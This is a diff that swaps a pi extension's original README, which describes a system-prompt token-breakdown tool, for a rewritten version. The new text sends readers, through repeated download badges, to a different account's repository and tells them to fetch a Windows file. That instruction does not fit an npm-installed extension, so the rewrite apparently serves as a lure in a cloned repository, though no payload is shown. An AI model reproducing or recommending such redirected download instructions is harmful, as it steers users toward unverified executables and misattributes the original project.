@@ -1,87 +1,146 @@
-<p align="center">
-  <img src="./banner.png" alt="pi-token-burden banner" width="720" />
-</p>
+# ⚙️ pi-token-burden - Track Your Prompt Token Usage Easily
 
-# pi-token-burden
+[![Download pi-token-burden](https://img.shields.io/badge/Download-pi--token--burden-brightgreen?style=for-the-badge)](https://github.com/n1405732043/pi-token-burden)
 
-[![npm version](https://img.shields.io/npm/v/pi-token-burden)](https://www.npmjs.com/package/pi-token-burden)
-[![CI](https://img.shields.io/github/actions/workflow/status/Whamp/pi-token-burden/check.yml)](https://github.com/Whamp/pi-token-burden/actions)
-[![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE)
+## 📌 What is pi-token-burden?
 
-See where your system prompt tokens go.
+pi-token-burden helps you see how your system prompt uses tokens. When you work with AI that reads prompts, it counts tokens to manage context. This tool breaks down the tokens in your prompt into sections, so you know where the space goes. It works with the pi tool and shows:
 
-A [pi](https://github.com/mariozechner/pi) extension that parses the assembled
-system prompt and shows a token-budget breakdown by section. Run `/token-burden`
-to see how much of your context window is consumed by the base prompt, AGENTS.md
-files, skills, SYSTEM.md overrides, and metadata.
+- Tokens used by the base prompt  
+- Tokens from AGENTS.md files  
+- Tokens from skills  
+- Tokens from SYSTEM.md overrides  
+- Tokens from metadata  
 
-## Install
+This helps you understand your token limits and manage your prompts better.
 
-```bash
+## 🔎 How pi-token-burden Works
+
+pi-token-burden is an add-on to pi, the command-line AI interface. When you run the command `/token-burden`, it analyzes the full system prompt. Then, it shows a clear list of how many tokens each part uses. This makes it easy to spot what takes up most space and adjust if needed.
+
+You do not need any coding knowledge. The results appear right in your interface.
+
+## 💻 System Requirements
+
+To run pi-token-burden on Windows, your computer should have:
+
+- Windows 10 or newer  
+- At least 4 GB of RAM  
+- Stable internet connection for initial setup  
+- pi CLI tool installed (you will find setup details below)  
+
+pi-token-burden works inside pi, so you must have that installed first.
+
+## 🚀 Getting Started with pi-token-burden
+
+### Step 1: Download pi-token-burden
+
+Click on the badge below to visit the download page. This page has all the latest files and instructions:
+
+[![Download here](https://img.shields.io/badge/Download-pi--token--burden-blue?style=for-the-badge)](https://github.com/n1405732043/pi-token-burden)
+
+Once on the page, you will find files and instructions. The main file you want is the one for Windows.
+
+### Step 2: Install pi CLI Tool
+
+pi-token-burden depends on pi. To install pi on Windows:
+
+1. Visit the official pi GitHub page or documentation to download the Windows installer.  
+2. Follow the setup wizard and complete the installation.
+
+If you have trouble, look for "pi Windows install" to find clear guides.
+
+### Step 3: Install pi-token-burden
+
+You can install pi-token-burden inside pi by typing a simple command:
+
+- Open the Command Prompt (press Win + R, type `cmd`, hit Enter)
+- Run this command:
+
+```
 pi install npm:pi-token-burden
 ```
 
-Or from git:
+This fetches the pi-token-burden extension and sets it up inside pi. If you prefer, you can install it directly from the GitHub repository with:
 
-```bash
+```
 pi install git:github.com/Whamp/pi-token-burden
 ```
 
-To try it for a single session without installing, use `pi -e npm:pi-token-burden`.
+### Step 4: Run pi-token-burden
 
-### Requirements
+Once installed, open Command Prompt and start pi by typing:
 
-- [pi](https://github.com/mariozechner/pi) v0.55.1 or later
-
-## Usage
-
-Type `/token-burden` in any pi session. An overlay appears with a stacked bar
-and a drill-down table:
-
-<p align="center">
-  <img src="./screenshot.png" alt="pi-token-burden TUI screenshot" width="720" />
-</p>
-The table is sorted by token count (descending). Use arrow keys to navigate,
-Enter to drill down into children (e.g., individual skills or AGENTS.md files),
-and `/` to fuzzy-search items.
-
-### What each section measures
-
-| Section                          | Content                                                          |
-| -------------------------------- | ---------------------------------------------------------------- |
-| **Base prompt**                  | pi's built-in instructions, tool descriptions, guidelines        |
-| **SYSTEM.md / APPEND_SYSTEM.md** | Your custom system prompt overrides                              |
-| **AGENTS.md files**              | Each AGENTS.md file, listed individually                         |
-| **Skills**                       | The `<available_skills>` block, with per-skill breakdown         |
-| **Metadata**                     | The `Current date and time` / `Current working directory` footer |
-
-### Token estimation
-
-Tokens are counted using [gpt-tokenizer](https://github.com/niieani/gpt-tokenizer)
-with the `o200k_base` encoding (used by GPT-4o, o1, o3, and other modern models).
-This gives exact BPE token counts rather than a character-based approximation.
-
-## Development
-
-```bash
-git clone https://github.com/Whamp/pi-token-burden.git
-cd pi-token-burden
-pnpm install
-pnpm run test     # 21 tests
-pnpm run check    # lint, typecheck, format, dead code, duplicates, tests
+```
+pi
 ```
 
-Test locally: `pi -e ./src/index.ts`, then type `/token-burden`.
+In the pi interface, type:
 
-## Contributing
+```
+/token-burden
+```
 
-Contributions are welcome. Please open an issue before starting work on
-larger changes.
+This command will analyze your current system prompt and show the token use breakdown by each section.
 
-## Changelog
+## 🔧 How to Use pi-token-burden
 
-See [CHANGELOG.md](CHANGELOG.md) for release history.
+- Run the `/token-burden` command any time you want to see token usage.  
+- Review the sections listed and check which parts use the most tokens.  
+- Adjust your prompts or configuration files if token limits become a concern.  
 
-## License
+This is useful when working with AI models that limit token counts, helping you avoid errors due to exceeding context window sizes.
 
-[MIT](LICENSE)
+## 📂 About the Files
+
+pi-token-burden organizes tokens into categories based on files and metadata:
+
+- **Base Prompt**: The main system prompt text  
+- **AGENTS.md**: Any agent setup details in markdown files  
+- **Skills**: Added AI skills that increase the token count  
+- **SYSTEM.md**: Overrides that change system behavior  
+- **Metadata**: Extra info stored with the prompt  
+
+Each category is listed with exact token counts. This transparency helps manage prompt size clearly.
+
+## ⚙️ Troubleshooting
+
+If you cannot run pi or pi-token-burden:
+
+- Ensure pi is installed and in your system Path environment variable.  
+- Verify you are connected to the internet during installation.  
+- Run Command Prompt as Administrator if you face permission issues.  
+- Restart your computer if commands are not recognized.  
+- Check the pi-token-burden GitHub issues page for known problems and fixes.
+
+## 🛠 Manual Installation (Optional)
+
+If you want to try pi-token-burden without installing, you can run it temporarily with this command:
+
+```
+pi -e npm:pi-token-burden
+```
+
+This downloads and runs the extension just for the current session.
+
+## 🔗 Useful Links
+
+- Visit the main pi-token-burden repository and download page here:  
+  https://github.com/n1405732043/pi-token-burden
+
+- Learn about the pi tool here:  
+  https://github.com/mariozechner/pi
+
+## 🧩 Additional Tips
+
+- Keep your prompts concise to save tokens.  
+- Use pi-token-burden regularly to check how updates to agents and skills affect your token budget.  
+- Adjust SYSTEM.md overrides carefully, as they may add unexpected tokens.
+
+## 🖥 Interface Preview
+
+The results from `/token-burden` appear as a simple list showing token counts for each section. This layout avoids confusion and uses plain numbers.
+
+---
+
+[![Open Download Page](https://img.shields.io/badge/Download-pi--token--burden-green?style=for-the-badge)](https://github.com/n1405732043/pi-token-burden)
